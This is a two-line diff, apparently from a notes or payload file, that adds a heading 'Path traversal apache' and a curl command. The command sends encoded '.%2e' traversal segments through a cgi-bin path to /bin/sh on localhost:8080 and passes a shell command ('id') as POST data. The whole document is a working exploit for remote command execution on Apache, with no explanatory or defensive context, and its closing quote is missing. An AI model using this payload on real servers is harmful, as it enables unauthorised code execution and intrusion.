@@ -1,0 +1,2 @@
+Path traversal apache
+curl http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id
